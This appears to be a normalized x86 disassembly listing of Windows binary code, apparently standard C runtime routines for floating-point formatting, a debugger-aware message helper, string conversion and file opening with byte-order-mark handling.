pop ebx
call sub_4170bc
leave
retn
mov ebx [ ebp + 0x14 ]
lea eax [ ebp - 0x2c ]
push eax
mov eax [ ebp - 0x28 ]
add eax ebx
push eax
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
push ecx
sete al
add eax edi
push eax
call sub_42d03c
add esp 0x10
test eax eax
je r-xdata
xor eax eax
cmp [ ebp - 0x2c ] 0x2d
mov ecx esi
sete al
sub ecx eax
pop esi
push [ ebp + 0x18 ]
lea eax [ ebp - 0x2c ]
push 0x0
push eax
push ebx
push esi
push edi
call sub_42797e
add esp 0x18
mov [ edi ] 0x0
jmp r-xdata
sub_427b27
push ebp
mov ebp esp
sub esp 0x30
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
push edi
mov edi [ ebp + 0xc ]
push 0x16
pop ebx
push ebx
lea ecx [ ebp - 0x1c ]
push ecx
lea ecx [ ebp - 0x30 ]
push ecx
push [ eax + 0x4 ]
push [ eax ]
call sub_42d2ca
add esp 0x14
test edi edi
jne r-xdata
push esi
mov esi [ ebp + 0x10 ]
test esi esi
jne r-xdata
call sub_41ccf1
mov [ eax ] ebx
call sub_41f411
mov eax ebx
jmp r-xdata
mov eax [ ebp - 0x2c ]
dec eax
xor ecx ecx
cmp [ ebp - 0x30 ] 0x2d
mov [ ebp - 0x20 ] eax
sete cl
or eax 0xffffffff
lea ebx [ ecx + edi ]
cmp esi eax
je r-xdata
call sub_41ccf1
mov [ eax ] ebx
call sub_41f411
mov eax ebx
jmp r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop ebx
call sub_4170bc
leave
retn
lea ecx [ ebp - 0x30 ]
push ecx
push [ ebp + 0x14 ]
push eax
push ebx
call sub_42d03c
add esp 0x10
test eax eax
je r-xdata
mov eax esi
sub eax ecx
pop esi
mov eax [ ebp - 0x2c ]
dec eax
cmp [ ebp - 0x20 ] eax
setl cl
cmp eax 0xfffffffc
jl r-xdata
mov [ edi ] 0x0
jmp r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push edi
call sub_427763
add esp 0x1c
cmp eax [ ebp + 0x14 ]
jge r-xdata
test cl cl
je r-xdata
push [ ebp + 0x1c ]
lea eax [ ebp - 0x30 ]
push 0x1
push eax
push [ ebp + 0x14 ]
push esi
push edi
call sub_42797e
add esp 0x18
jmp r-xdata
mov al [ ebx ]
inc ebx
test al al
jne r-xdata
mov [ ebx - 0x2 ] al
sub_427c35
push ebp
mov ebp esp
sub esp 0x10
push edi
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_4199d2
mov edx [ ebp + 0x8 ]
mov edi [ ebp - 0x10 ]
mov cl [ edx ]
test cl cl
je r-xdata
mov al [ edx ]
inc edx
test al al
je r-xdata
mov eax [ edi + 0x84 ]
mov eax [ eax ]
mov al [ eax ]
cmp [ ebp - 0x4 ] 0x0
pop edi
je r-xdata
jmp r-xdata
inc edx
mov cl [ edx ]
test cl cl
jne r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
mov al [ edx ]
test al al
jne r-xdata
cmp cl al
je r-xdata
cmp al 0x65
je r-xdata
push esi
mov esi edx
cmp al 0x45
je r-xdata
dec edx
cmp [ edx ] 0x30
je r-xdata
mov eax [ edi + 0x84 ]
mov ecx [ eax ]
mov al [ edx ]
cmp al [ ecx ]
jne r-xdata
inc edx
mov al [ esi ]
inc edx
inc esi
mov [ edx ] al
test al al
jne r-xdata
dec edx
pop esi
sub_427ccb
push ebp
mov ebp esp
push ecx
push ecx
cmp [ ebp + 0x8 ] 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
je r-xdata
lea eax [ ebp + 0x8 ]
push eax
call sub_42d178
mov ecx [ ebp + 0xc ]
mov eax [ ebp + 0x8 ]
mov [ ecx ] eax
lea eax [ ebp - 0x8 ]
push eax
call sub_42d0ec
mov ecx [ ebp + 0xc ]
mov eax [ ebp - 0x8 ]
mov [ ecx ] eax
mov eax [ ebp - 0x4 ]
mov [ ecx + 0x4 ] eax
jmp r-xdata
add esp 0xc
leave
retn
sub_427d1c
push ebp
mov ebp esp
sub esp 0x10
lea ecx [ ebp - 0x10 ]
push esi
push [ ebp + 0xc ]
call sub_4199d2
mov esi [ ebp + 0x8 ]
movsx eax [ esi ]
push eax
call sub_41ce9f
cmp eax 0x65
jmp r-xdata
pop ecx
jne r-xdata
inc esi
movzx eax [ esi ]
push eax
call sub_41b1a0
test eax eax
movsx eax [ esi ]
push eax
call sub_41ce9f
pop ecx
cmp eax 0x78
jne r-xdata
mov eax [ ebp - 0x10 ]
mov cl [ esi ]
mov eax [ eax + 0x84 ]
mov eax [ eax ]
mov al [ eax ]
mov [ esi ] al
inc esi
add esi 0x2
mov al [ esi ]
mov [ esi ] cl
mov cl al
mov al [ esi ]
inc esi
test al al
jne r-xdata
pop esi
cmp [ ebp - 0x4 ] al
je r-xdata
leave
retn
mov eax [ ebp - 0x8 ]
and [ eax + 0x70 ] 0xfffffffd
sub_427d8e
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
fldz
fcomp [ eax ]
fnstsw ax
test ah 0x41
jpe r-xdata
xor eax eax
pop ebp
retn
xor eax eax
inc eax
pop ebp
retn
sub_427da8
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0xc ]
test edi edi
je r-xdata
pop edi
pop ebp
retn
push esi
mov esi [ ebp + 0x8 ]
push esi
call sub_41a7f0
inc eax
push eax
lea eax [ esi + edi ]
push esi
push eax
call sub_4170d0
add esp 0x10
pop esi
sub_427dd0
push esi
push 0x30000
push 0x10000
xor esi esi
push esi
call sub_42d45f
add esp 0xc
test eax eax
jne r-xdata
push esi
push esi
push esi
push esi
push esi
call sub_41f421
int3
pop esi
retn
sub_427df7
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0xc ]
lea ecx [ ebp - 0x10 ]
call sub_4199d2
mov eax [ ebp - 0x10 ]
movzx ecx [ ebp + 0x8 ]
mov eax [ eax + 0x90 ]
movzx eax [ eax + ecx * 2 ]
and eax 0x8000
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_427e40
cmp [ edx + 0xe ] 0x5
jne r-xdata
mov bx 0x133f
mov bx [ ebp - 0xa4 ]
or bh 0x2
and bh 0xfe
mov bl 0x3f
jmp r-xdata
mov [ ebp - 0xa2 ] bx
fldcw [ ebp - 0xa2 ]
mov ebx r--data
fxam
mov [ ebp - 0x94 ] edx
fwait
fnstsw [ ebp - 0xa0 ]
mov [ ebp - 0x90 ] 0x0
fwait
mov cl [ ebp - 0x9f ]
shl cl 0x1
sar cl 0x1
rol cl 0x1
mov al cl
and al 0xf
xlat
movsx eax al
and ecx 0x404
mov ebx edx
add ebx eax
add ebx 0x10
jmp [ ebx ]
sub_428010
push ebp
mov ebp esp
add esp 0xffffffe0
mov [ ebp - 0x20 ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0x10 ] eax
mov eax [ ebp + 0x1c ]
mov [ ebp - 0xc ] eax
jmp r-xdata
fstp [ ebp - 0x8 ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
lea eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x20 ]
push eax
push ecx
push edx
call sub_42d4bc
add esp 0xc
fld [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x27f
je r-xdata
leave
retn
fldcw [ ebp + 0x8 ]
sub_428027
push ebp
mov ebp esp
add esp 0xffffffe0
mov [ ebp - 0x20 ] eax
fstp [ ebp - 0x8 ]
mov [ ebp - 0x1c ] ecx
mov eax [ ebp + 0x10 ]
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x18 ] eax
mov [ ebp - 0x14 ] ecx
lea eax [ ebp + 0x8 ]
lea ecx [ ebp - 0x20 ]
push eax
push ecx
push edx
call sub_42d4bc
add esp 0xc
fld [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] 0x27f
je r-xdata
leave
retn
fldcw [ ebp + 0x8 ]
sub_4280b5
mov eax [ edx + 0x4 ]
and eax 0x7ff00000
cmp eax 0x7ff00000
je r-xdata
mov eax [ edx + 0x4 ]
sub esp 0xa
or eax 0x7fff0000
mov [ esp + 0x6 ] eax
mov eax [ edx + 0x4 ]
mov ecx [ edx ]
shld eax ecx 0xb
shl ecx 0xb
mov [ esp + 0x4 ] eax
mov [ esp ] ecx
fld [ esp ]
add esp 0xa
test eax 0x0
mov eax [ edx + 0x4 ]
retn
fld [ edx ]
retn
sub_428145
sub esp 0x8
fst [ esp ]
mov eax [ esp + 0x4 ]
add esp 0x8
and eax 0x7ff00000
jmp r-xdata
cmp eax 0x7ff00000
je r-xdata
fld [ r--data ]
fxch st1
fscale
fstp st1
fld st0
fabs
fcomp [ r--data ]
fwait
fnstsw ax
sahf
mov eax 0x3
jbe r-xdata
mov ax [ esp ]
cmp ax 0x27f
je r-xdata
cmp edx 0x1d
je r-xdata
fmul [ r--data ]
jmp r-xdata
pop edx
retn
and ax 0x20
jne r-xdata
call sub_428010
pop edx
retn
call sub_428027
pop edx
retn
fldcw [ esp ]
fwait
fnstsw ax
and ax 0x20
je r-xdata
mov eax 0x8
sub_4281fc
push ebp
mov ebp esp
sub esp 0x24
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov ebx [ EncodePointer@IAT ]
push esi
push edi
mov [ ebp - 0x1c ] eax
mov eax [ ebp + 0xc ]
xor edi edi
push edi
mov [ ebp - 0x20 ] eax
call ebx
mov esi eax
mov [ ebp - 0x18 ] esi
call sub_41c7c6
mov [ ebp - 0x14 ] eax
cmp [ rw-data ] edi
jne r-xdata
call [ IsDebuggerPresent@IAT ]
test eax eax
je r-xdata
push 0x800
push edi
push r--data
call [ LoadLibraryExW@IAT ]
mov esi eax
test esi esi
jne r-xdata
cmp [ ebp - 0x14 ] edi
je r-xdata
mov eax [ ebp - 0x1c ]
test eax eax
je r-xdata
push r--data
push esi
call [ GetProcAddress@IAT ]
test eax eax
je r-xdata
call [ GetLastError@IAT ]
cmp eax 0x57
jne r-xdata
mov eax [ rw-data ]
mov ebx [ DecodePointer@IAT ]
cmp eax esi
je r-xdata
push [ rw-data ]
call [ DecodePointer@IAT ]
push 0x3
jmp r-xdata
cmp [ ebp - 0x14 ] edi
je r-xdata
push eax
call [ OutputDebugStringW@IAT ]
xor eax eax
push eax
call ebx
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
push eax
call ebx
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
push eax
call ebx
push r--data
push esi
mov [ rw-data ] eax
call [ GetProcAddress@IAT ]
push eax
call ebx
mov [ rw-data ] eax
test eax eax
je r-xdata
push r--data
call [ LoadLibraryW@IAT ]
mov esi eax
test esi esi
je r-xdata
mov eax [ rw-data ]
cmp eax esi
je r-xdata
cmp [ rw-data ] esi
je r-xdata
pop eax
jmp r-xdata
push 0x4
mov esi [ ebp - 0x18 ]
push r--data
push esi
call [ GetProcAddress@IAT ]
push eax
call ebx
mov [ rw-data ] eax
mov esi [ ebp + 0x10 ]
push eax
call ebx
test eax eax
je r-xdata
push eax
call ebx
push [ rw-data ]
mov [ ebp - 0x14 ] eax
call ebx
mov ecx [ ebp - 0x14 ]
mov [ ebp - 0x18 ] eax
test ecx ecx
je r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
pop esi
xor ecx ebp
pop ebx
call sub_4170bc
leave
retn
push esi
push [ ebp - 0x20 ]
push [ ebp - 0x1c ]
push edi
call eax
jmp r-xdata
call eax
mov edi eax
test edi edi
je r-xdata
test eax eax
je r-xdata
mov eax [ rw-data ]
cmp eax esi
je r-xdata
call ecx
test eax eax
je r-xdata
push eax
call ebx
test eax eax
je r-xdata
mov esi [ ebp + 0x10 ]
or esi 0x200000
jmp r-xdata
lea ecx [ ebp - 0x24 ]
push ecx
push 0xc
lea ecx [ ebp - 0x10 ]
push ecx
push 0x1
push eax
call [ ebp - 0x18 ]
test eax eax
je r-xdata
push edi
call eax
mov edi eax
push [ rw-data ]
call ebx
test eax eax
je r-xdata
test [ ebp - 0x8 ] 0x1
jne r-xdata
sub_4283de
push ebp
mov ebp esp
push ecx
push ecx
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
push ebx
mov eax [ eax ]
push esi
mov eax [ eax + 0x4 ]
push edi
xor esi esi
push esi
push esi
push [ ebp + 0x10 ]
mov [ ebp - 0x8 ] eax
push [ ebp + 0xc ]
call sub_41e86a
mov ebx eax
add esp 0x10
test ebx ebx
jne r-xdata
jle r-xdata
xor eax eax
jmp r-xdata
mov edi esi
push 0xffffffe0
xor edx edx
pop eax
div ebx
cmp eax 0x2
jb r-xdata
lea esp [ ebp - 0x14 ]
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_4170bc
leave
retn
push ebx
push edi
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call sub_41e86a
add esp 0x10
test eax eax
je r-xdata
lea eax [ ebx * 2 + 0x8 ]
cmp eax 0x400
ja r-xdata
push edi
call sub_419a5a
pop ecx
mov eax esi
push esi
push esi
cmp [ ebp + 0x18 ] esi
jne r-xdata
push eax
call sub_41794a
mov edi eax
pop ecx
test edi edi
je r-xdata
call sub_424c40
mov edi esp
test edi edi
je r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push esi
push esi
jmp r-xdata
mov [ edi ] 0xdddd
mov [ edi ] 0xcccc
jmp r-xdata
push 0xffffffff
push edi
push esi
push [ ebp - 0x8 ]
call [ WideCharToMultiByte@IAT ]
mov esi eax
test edi edi
je r-xdata
add edi 0x8
jmp r-xdata
sub_4284b6
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_4199d2
push [ ebp + 0x18 ]
lea eax [ ebp - 0x10 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push eax
call sub_4283de
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
je r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
sub_4284ee
push ebp
mov ebp esp
sub esp 0x1c
push esi
call sub_41c7c6
test eax eax
je r-xdata
mov esi [ ebp - 0x4 ]
push r--data
push r--data
call [ GetModuleHandleW@IAT ]
push eax
call [ GetProcAddress@IAT ]
mov esi eax
test esi esi
jne r-xdata
or eax [ ebp + 0x20 ]
push 0x0
push eax
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call [ CreateFileW@IAT ]
and [ ebp - 0x10 ] 0x0
and [ ebp - 0x8 ] 0x0
mov [ ebp - 0x18 ] eax
mov eax [ ebp + 0x20 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp + 0x14 ]
mov [ ebp - 0xc ] eax
lea eax [ ebp - 0x1c ]
push eax
push [ ebp + 0x18 ]
mov [ ebp - 0x1c ] 0x18
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call esi
jmp r-xdata
call sub_41c7c6
test eax eax
mov eax [ ebp + 0x1c ]
je r-xdata
or eax 0xffffffff
jmp r-xdata
pop esi
leave
retn
sub_42857f
push 0x14
push r--data
call sub_41ecb0
and [ ebp - 0x1c ] 0x0
xor eax eax
mov esi [ ebp + 0x18 ]
test esi esi
setne al
test eax eax
jne r-xdata
or [ esi ] 0xffffffff
xor eax eax
cmp [ ebp + 0x8 ] eax
setne al
test eax eax
je r-xdata
call sub_41ccf1
push 0x16
pop esi
mov [ eax ] esi
call sub_41f411
mov eax esi
jmp r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
call sub_41ecf5
retn
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x1c ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push esi
lea eax [ ebp - 0x1c ]
push eax
call sub_428646
add esp 0x1c
mov edi eax
mov [ ebp - 0x20 ] edi
mov [ ebp - 0x4 ] 0xfffffffe
call sub_42861a
test edi edi
je r-xdata
mov eax [ ebp + 0x14 ]
and eax 0xfffffe7f
neg eax
sbb eax eax
inc eax
je r-xdata
mov eax edi
or [ esi ] 0xffffffff
sub_42861a
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
test edi edi
je r-xdata
push [ esi ]
call sub_42a525
pop ecx
mov ecx [ esi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
shl ecx 0x6
mov eax [ eax * 4 + rw-data ]
and [ eax + ecx + 0x4 ] 0xfe
sub_428646
push ebp
mov ebp esp
sub esp 0x38
push ebx
xor ebx ebx
test [ ebp + 0x14 ] 0x80
push edi
mov [ ebp - 0x20 ] ebx
mov [ ebp - 0x2 ] bl
mov [ ebp - 0x38 ] 0xc
mov [ ebp - 0x34 ] ebx
je r-xdata
mov [ ebp - 0x30 ] 0x1
mov [ ebp - 0x1 ] bl
mov [ ebp - 0x30 ] ebx
mov [ ebp - 0x1 ] 0x10
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_41f421
int3
mov ecx [ ebp + 0x14 ]
mov eax 0x8000
test eax ecx
jne r-xdata
lea eax [ ebp - 0x20 ]
push eax
call sub_42d779
pop ecx
test eax eax
jne r-xdata
mov eax ecx
and eax 0x3
mov edx 0xc0000000
sub eax ebx
je r-xdata
test ecx 0x74000
jne r-xdata
mov edi 0x80000000
dec eax
je r-xdata
or [ ebp - 0x1 ] 0x80
cmp [ ebp - 0x20 ] eax
je r-xdata
mov [ ebp - 0xc ] ebx
sub eax esi
je r-xdata
test cl 0x8
je r-xdata
dec eax
je r-xdata
cmp eax 0x500
je r-xdata
je r-xdata
mov [ ebp - 0xc ] 0x1
jmp r-xdata
sub eax esi
je r-xdata
mov edi 0x40000000
jmp r-xdata
test ecx 0x70000
je r-xdata
mov edi edx
jmp r-xdata
call sub_41ccbd
mov [ eax ] ebx
mov eax [ ebp + 0xc ]
or [ eax ] 0xffffffff
call sub_41ccf1
push 0x16
pop ebx
mov [ eax ] ebx
call sub_41f411
mov eax ebx
jmp r-xdata
xor esi esi
inc esi
cmp eax 0x600
je r-xdata
push 0x3
test eax eax
je r-xdata
mov eax ecx
and eax 0x700
mov esi 0x400
cmp eax esi
jg r-xdata
mov [ ebp - 0xc ] edx
jmp r-xdata
sub eax esi
je r-xdata
mov [ ebp - 0x8 ] edi
mov edi edx
mov [ ebp - 0x8 ] edx
jmp r-xdata
pop edi
pop ebx
leave
retn
test cl 0x40
je r-xdata
mov eax [ rw-data ]
not eax
and eax [ ebp + 0x1c ]
test al al
mov eax ebx
js r-xdata
push 0x5
jmp r-xdata
cmp eax 0x700
je r-xdata
mov edx 0x80
mov eax ebx
mov [ ebp - 0x18 ] edx
mov [ ebp - 0x10 ] eax
test ecx 0x100
je r-xdata
cmp eax 0x100
je r-xdata
mov [ ebp - 0xc ] 0x3
jmp r-xdata
sub eax 0x40
jne r-xdata
mov eax [ ebp + 0x18 ]
push esi
push 0x10
pop esi
push 0x2
pop edx
mov [ ebp - 0x28 ] edx
sub eax esi
je r-xdata
test ecx 0x1000
je r-xdata
or edi 0x10000
or [ ebp - 0xc ] 0x4
mov eax 0x4000000
mov [ ebp - 0x10 ] eax
mov [ ebp - 0x8 ] edi
xor edx edx
inc edx
mov [ ebp - 0x18 ] edx
pop esi
jmp r-xdata
call sub_41ccbd
mov [ eax ] ebx
mov eax [ ebp + 0xc ]
or [ eax ] 0xffffffff
call sub_41ccf1
push 0x16
pop ebx
mov [ eax ] ebx
call sub_41f411
jmp r-xdata
push 0x4
jmp r-xdata
cmp eax 0x200
je r-xdata
cmp edi 0x80000000
sete al
mov [ ebp - 0xc ] eax
jmp r-xdata
test ecx 0x2000
je r-xdata
or edx 0x100
mov [ ebp - 0x18 ] edx
mov eax ebx
jmp r-xdata
cmp eax 0x300
jne r-xdata
test cl 0x20
je r-xdata
or eax 0x2000000
mov [ ebp - 0x10 ] eax
pop esi
mov esi edx
jmp r-xdata
test cl 0x10
je r-xdata
or eax 0x8000000
jmp r-xdata
call sub_42a211
mov edi [ ebp + 0xc ]
mov [ edi ] eax
cmp eax 0xffffffff
jne r-xdata
or eax 0x10000000
mov [ ebp - 0x10 ] eax
push [ ebp - 0x10 ]
mov eax [ ebp + 0x8 ]
push [ ebp - 0x18 ]
mov [ eax ] 0x1
push esi
lea eax [ ebp - 0x38 ]
push eax
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
push [ ebp + 0x10 ]
call sub_4284ee
add esp 0x1c
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
call sub_41ccbd
mov [ eax ] ebx
or [ edi ] 0xffffffff
call sub_41ccf1
mov [ eax ] 0x18
call sub_41ccf1
mov eax [ eax ]
push eax
call [ GetFileType@IAT ]
test eax eax
jne r-xdata
mov ecx [ ebp - 0x8 ]
mov edx 0xc0000000
mov eax ecx
and eax edx
cmp eax edx
jne r-xdata
cmp eax 0x2
jne r-xdata
mov ecx [ edi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
and [ eax + ecx + 0x4 ] 0xfe
call [ GetLastError@IAT ]
mov esi eax
push esi
call sub_41ccd0
pop ecx
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
test esi esi
jne r-xdata
mov ecx [ edi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
and [ eax + ecx + 0x4 ] 0xfe
call [ GetLastError@IAT ]
push eax
call sub_41ccd0
test [ ebp + 0x14 ] 0x1
je r-xdata
cmp eax 0x3
jne r-xdata
or [ ebp - 0x1 ] 0x40
jmp r-xdata
call sub_41ccf1
mov ebx [ eax ]
jmp r-xdata
call sub_41ccf1
mov [ eax ] 0xd
jmp r-xdata
push [ ebp - 0x10 ]
lea eax [ ebp - 0x38 ]
push [ ebp - 0x18 ]
and ecx 0x7fffffff
push esi
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x8 ] ecx
push ecx
push [ ebp + 0x10 ]
call sub_4284ee
add esp 0x1c
mov [ ebp - 0x1c ] eax
cmp eax 0xffffffff
jne r-xdata
push [ ebp - 0x1c ]
push [ edi ]
call sub_42a4a3
mov dl [ ebp - 0x1 ]
pop ecx
pop ecx
mov ecx [ edi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
or dl 0x1
mov [ eax + ecx + 0x4 ] dl
mov ecx [ edi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
mov [ ebp - 0x1 ] dl
and [ eax + ecx + 0x24 ] 0x80
mov ecx [ ebp + 0x14 ]
mov al dl
and al 0x48
mov [ ebp - 0x3 ] al
jne r-xdata
or [ ebp - 0x1 ] 0x8
test dl dl
jns r-xdata
test dl dl
jns r-xdata
mov edx [ edi ]
mov eax edx
sar eax 0x5
and edx 0x1f
mov ecx [ eax * 4 + rw-data ]
shl edx 0x6
mov al [ ecx + edx + 0x24 ]
xor al [ ebp - 0x2 ]
and al 0x7f
xor [ ecx + edx + 0x24 ] al
mov esi [ edi ]
mov ecx [ ebp + 0x14 ]
mov eax esi
sar eax 0x5
and esi 0x1f
mov edx [ eax * 4 + rw-data ]
shl esi 0x6
shr ecx 0x10
mov al [ edx + esi + 0x24 ]
shl cl 0x7
and al 0x7f
or cl al
mov [ edx + esi + 0x24 ] cl
mov ecx [ ebp + 0x14 ]
cmp [ ebp - 0x3 ] bl
jne r-xdata
test ecx 0x74000
jne r-xdata
test cl 0x2
je r-xdata
mov esi [ ebp - 0x8 ]
mov edx 0xc0000000
mov eax esi
and eax edx
cmp eax edx
jne r-xdata
test cl 0x8
je r-xdata
mov eax ecx
and eax 0x74000
cmp eax 0x4000
je r-xdata
mov eax [ ebp - 0x20 ]
and eax 0x74000
jne r-xdata
push 0x2
push 0xffffffff
push 0xffffffff
push [ edi ]
call sub_421d63
mov ecx eax
and ecx edx
add esp 0x10
mov [ ebp - 0x2c ] eax
mov [ ebp - 0x14 ] edx
cmp ecx 0xffffffff
jne r-xdata
test cl 0x1
je r-xdata
mov ecx [ edi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
or [ eax + ecx + 0x4 ] 0x20
mov ecx [ ebp + 0x14 ]
mov [ ebp - 0x2 ] bl
cmp eax 0x10000
je r-xdata
or ecx eax
or ecx 0x4000
jmp r-xdata
push 0x1
lea eax [ ebp - 0x24 ]
push eax
push [ edi ]
mov [ ebp - 0x24 ] ebx
call sub_420a78
add esp 0xc
test eax eax
jne r-xdata
call sub_41ccbd
cmp [ eax ] 0x83
je r-xdata
push [ ebp - 0x1c ]
call [ CloseHandle@IAT ]
push [ ebp - 0x10 ]
lea eax [ ebp - 0x38 ]
push [ ebp - 0x18 ]
and esi 0x7fffffff
push 0x3
push eax
push [ ebp - 0xc ]
push esi
push [ ebp + 0x10 ]
call sub_4284ee
add esp 0x1c
cmp eax 0xffffffff
jne r-xdata
mov [ ebp - 0x14 ] ebx
test dl 0x40
jne r-xdata
mov eax ecx
and eax 0x301
cmp eax 0x301
jne r-xdata
cmp eax 0x14000
je r-xdata
mov [ ebp + 0x14 ] ecx
push ebx
push ebx
push ebx
push [ edi ]
call sub_421d63
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
cmp [ ebp - 0x24 ] 0x1a
jne r-xdata
mov dl [ ebp - 0x1 ]
mov ecx [ ebp + 0x14 ]
push [ edi ]
call sub_422377
jmp r-xdata
mov edx [ edi ]
mov ecx edx
sar ecx 0x5
and edx 0x1f
mov ecx [ ecx * 4 + rw-data ]
shl edx 0x6
mov [ edx + ecx ] eax
call [ GetLastError@IAT ]
push eax
call sub_41ccd0
mov ecx [ edi ]
mov eax ecx
sar eax 0x5
and ecx 0x1f
mov eax [ eax * 4 + rw-data ]
shl ecx 0x6
and [ eax + ecx + 0x4 ] 0xfe
push [ edi ]
call sub_42a3b6
pop ecx
jmp r-xdata
mov eax [ ebp - 0x8 ]
mov ecx 0xc0000000
and eax ecx
cmp eax 0x40000000
je r-xdata
test ecx 0x70000
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
cmp eax 0x20000
je r-xdata
push [ ebp - 0x14 ]
push [ ebp - 0x2c ]
push [ edi ]
call sub_42d5c5
add esp 0xc
cmp eax 0xffffffff
je r-xdata
pop ecx
test esi esi
je r-xdata
cmp eax 0x80000000
je r-xdata
cmp eax 0x24000
je r-xdata
push 0x2
pop ecx
cmp esi ecx
jbe r-xdata
push 0x3
lea eax [ ebp - 0x14 ]
push eax
push [ edi ]
call sub_420a78
add esp 0xc
cmp eax 0xffffffff
je r-xdata
cmp eax ecx
jne r-xdata
cmp eax 0x40000
je r-xdata
movsx eax [ ebp - 0x2 ]
mov esi ebx
dec eax
je r-xdata
cmp esi 0x4
ja r-xdata
mov ecx [ ebp - 0x14 ]
push 0x2
pop edx
cmp eax edx
je r-xdata
test esi esi
je r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
cmp eax 0x44000
jne r-xdata
push 0x3
pop ecx
mov [ ebp - 0x14 ] 0xbfbbef
mov [ ebp - 0x28 ] ecx
dec eax
jne r-xdata
cmp esi 0x5
je r-xdata
push ecx
push ebx
push ebx
push [ edi ]
call sub_421d63
add esp 0x10
or eax edx
je r-xdata
and ecx 0xffff
cmp ecx 0xfffe
jne r-xdata
cmp eax 0x3
jne r-xdata
push 0x2
pop ecx
cmp esi ecx
jbe r-xdata
mov ecx [ ebp - 0x28 ]
add esi eax
cmp ecx esi
jg r-xdata
mov [ ebp - 0x14 ] 0xfeff
jmp r-xdata
jmp r-xdata
push 0x2
pop ecx
push ebx
push ebx
push ebx
push [ edi ]
call sub_421d63
and eax edx
add esp 0x10
cmp eax 0xffffffff
jne r-xdata
cmp ecx 0xfeff
jne r-xdata
push [ edi ]
call sub_422377
pop ecx
call sub_41ccf1
push 0x16
pop ebx
mov [ eax ] ebx
jmp r-xdata
cmp ecx 0xbfbbef
jne r-xdata
cmp esi 0x4
jbe r-xdata
mov eax ecx
sub eax esi
push eax
lea eax [ ebp - 0x14 ]
add eax esi
push eax
push [ edi ]
call sub_421207
add esp 0xc
cmp eax 0xffffffff
je r-xdata
jmp r-xdata
push ebx
push ebx
push edx
push [ edi ]
call sub_421d63
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
mov [ ebp - 0x2 ] 0x1
jmp r-xdata
push ecx
push ebx
push ebx
push [ edi ]
call sub_421d63
add esp 0x10
or eax edx
je r-xdata
mov [ ebp - 0x2 ] 0x2
jmp r-xdata
push ebx
push ebx
push ebx
push [ edi ]
call sub_421d63
and eax edx
add esp 0x10
cmp eax 0xffffffff
je r-xdata
sub_428db5
push ebp
mov ebp esp
mov eax [ ebp + 0x10 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0xc ]
mov edx [ ebp + 0x8 ]
push esi
pop ebp
retn
